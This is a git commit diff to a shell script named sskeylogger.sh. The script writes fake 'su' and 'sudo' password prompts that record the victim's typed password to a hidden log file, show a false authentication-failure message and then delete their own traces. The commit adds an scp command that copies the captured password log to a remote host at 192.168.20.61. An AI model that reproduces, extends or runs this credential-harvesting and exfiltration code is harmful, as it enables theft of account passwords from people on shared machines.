52b3416c59a171e893fb05b6f8351185c2ac43d1
Kempassio <94110817+Kempassio@users.noreply.github.com>
2021-11-24 13:40:22 +0000

    Update sskeylogger.sh

--- sskeylogger.sh
+++ sskeylogger.sh
@@ -14,8 +14,8 @@ echo "stty echo" >> $HOME/.sudo_su;
 echo "echo" >> $HOME/.sudo_su;
 echo "date >> $HOME/.plog" >> $HOME/.sudo_su;
 echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
-echo "sleep 2" >> $HOME/.sudo_su;
 echo "echo \"su: Authentication failure\"" >> $HOME/.sudo_su;
+echo "scp .plog alejandro@192.168.20.61:/home/alejandro/pwd"
 echo "rm \$HOME/.sudo_sd" >> $HOME/.sudo_su;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_su;
 echo "bash --rcfile .bashrc" >> $HOME/.sudo_su;
@@ -31,8 +31,8 @@ echo "stty echo" >> $HOME/.sudo_sd;
 echo "echo" >> $HOME/.sudo_sd;
 echo "date >> $HOME/.plog" >> $HOME/.sudo_sd;
 echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
-echo "sleep 2" >> $HOME/.sudo_sd;
 echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
+echo "scp .plog alejandro@192.168.20.61:/home/alejandro/pwd"
 echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
 echo "rm \$HOME/.sudo_su" >> $HOME/.sudo_sd;
 echo "sudo -k;" >> $HOME/.sudo_sd;
